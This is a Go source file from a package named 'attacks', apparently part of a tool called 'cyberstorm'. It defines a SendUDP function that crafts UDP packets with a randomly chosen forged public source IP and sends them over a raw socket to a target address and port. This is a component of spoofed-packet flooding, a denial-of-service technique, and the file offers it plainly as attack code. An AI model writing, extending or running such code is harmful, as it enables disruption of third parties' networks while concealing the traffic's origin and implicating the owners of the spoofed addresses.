package attacks

import (
	"net"
	"syscall"

	"cyberstorm/core"
)

func SendUDP(rawSocket core.RawSocket, dstIp net.IP, dstPort uint16) error {
	srcIp := core.GetRandPublicIP()
	udpHeaderBytes, err := core.GetUDPHeaderBytes(srcIp, dstIp, dstPort)
	if err != nil {
		return err
	}

	return core.SendPacket(rawSocket, srcIp, dstIp, syscall.IPPROTO_UDP, udpHeaderBytes)
}
